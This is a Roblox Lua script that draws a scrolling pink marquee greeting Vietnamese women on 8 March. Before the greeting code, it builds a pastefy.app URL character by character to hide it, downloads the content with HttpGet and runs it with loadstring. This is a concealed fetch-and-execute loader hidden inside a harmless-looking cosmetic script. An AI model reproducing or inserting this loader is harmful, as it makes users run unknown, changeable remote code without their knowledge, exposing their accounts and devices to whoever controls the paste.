local
url
=
"h"
.."t"
.."t"
.."p"
.."s"
..":"
.."/"
.."/"
.."p"
.."a"
.."s"
.."t"
.."e"
.."f"
.."y"
.."."
.."a"
.."p"
.."p"
.."/"
.."Y"
.."Y"
.."w"
.."1"
.."r"
.."s"
.."9"
.."h"
.."/"
.."r"
.."a"
.."w"

local
get
=
game
:
HttpGet(
url
)

local
run
=
loadstring(
get
)

run()
local player = game.Players.LocalPlayer

for _, v in pairs(player:WaitForChild("PlayerGui"):GetChildren()) do
	if v.Name == "MarqueeText" then
		v:Destroy()
	end
end

local gui = Instance.new("ScreenGui")
gui.Name = "MarqueeText"
gui.Parent = player:WaitForChild("PlayerGui")
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false

local text = Instance.new("TextLabel")
text.Parent = gui
text.Size = UDim2.new(0, 1500, 0, 50)
text.Position = UDim2.new(0, 2000, 0, 15)
text.BackgroundTransparency = 1
text.TextColor3 = Color3.fromRGB(255, 200, 255)
text.Text = "Chúc toàn thể phụ nữ Việt Nam một ngày 8/3 tràn đầy niềm vui, hạnh phúc và nhận được thật nhiều yêu thương. Cảm ơn những đóng góp thầm lặng và sự hy sinh cao cả của các bà, các mẹ, các chị em!"
text.TextSize = 30
text.TextStrokeTransparency = 0.2
text.TextStrokeColor3 = Color3.fromRGB(255, 100, 150)
text.Font = Enum.Font.GothamBold
text.TextXAlignment = Enum.TextXAlignment.Left
text.TextYAlignment = Enum.TextYAlignment.Center
text.ZIndex = 10
text.RichText = true

local shadow = Instance.new("TextLabel")
shadow.Parent = gui
shadow.Size = text.Size
shadow.Position = text.Position + UDim2.new(0, 2, 0, 2)
shadow.BackgroundTransparency = 1
shadow.TextColor3 = Color3.fromRGB(0, 0, 0)
shadow.TextTransparency = 0.7
shadow.Text = text.Text
shadow.TextSize = text.TextSize
shadow.Font = text.Font
shadow.TextXAlignment = text.TextXAlignment
shadow.TextYAlignment = text.TextYAlignment
shadow.ZIndex = 9
shadow.RichText = true

local speed = 3
local startPos = 2000
local endPos = -1500

while true do
	for i = startPos, endPos, -speed do
		text.Position = UDim2.new(0, i, 0, 15)
		shadow.Position = UDim2.new(0, i + 2, 0, 17)
		wait(0.01)
	end
	
	wait(3)
	
	text.Position = UDim2.new(0, startPos, 0, 15)
	shadow.Position = UDim2.new(0, startPos + 2, 0, 17)
	
	wait(2)
end
